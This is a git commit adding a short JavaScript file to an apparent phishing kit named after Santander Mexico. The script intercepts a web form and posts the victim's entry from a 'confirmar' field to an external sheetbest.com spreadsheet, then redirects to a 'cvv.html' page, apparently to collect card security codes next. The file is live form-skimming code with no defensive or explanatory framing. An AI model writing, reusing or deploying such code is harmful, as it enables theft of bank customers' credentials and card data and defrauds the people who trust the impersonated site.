18d60f493226de93b903d5b7a785f15b8def275f
santander-mx-26 <luisgonzales4355@gmail.com>
2026-01-14 17:01:22 -0600

    add

---
+++ js/fecha.js
@@ -0,0 +1,34 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/f740aab2-9960-46d7-af27-479980a6ae6c', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            
+            "Datos": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+	
+	setTimeout(() => {
+    window.location.href = "cvv.html";
+}, 1000);
+});
